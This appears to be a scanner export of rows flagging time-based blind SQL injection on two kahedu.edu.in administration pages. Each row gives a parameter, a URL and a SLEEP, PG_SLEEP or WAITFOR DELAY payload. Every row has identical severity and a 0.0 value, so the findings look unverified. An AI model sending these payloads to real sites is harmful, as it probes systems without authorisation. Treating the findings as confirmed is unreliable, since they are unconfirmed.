Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/finance-officer/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/finance-officer/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/finance-officer/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/finance-officer/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/finance-officer/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/finance-officer/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/finance-officer/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/administration/deans/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/administration/deans/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/administration/deans/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/administration/deans/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/administration/deans/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/administration/deans/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/administration/deans/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
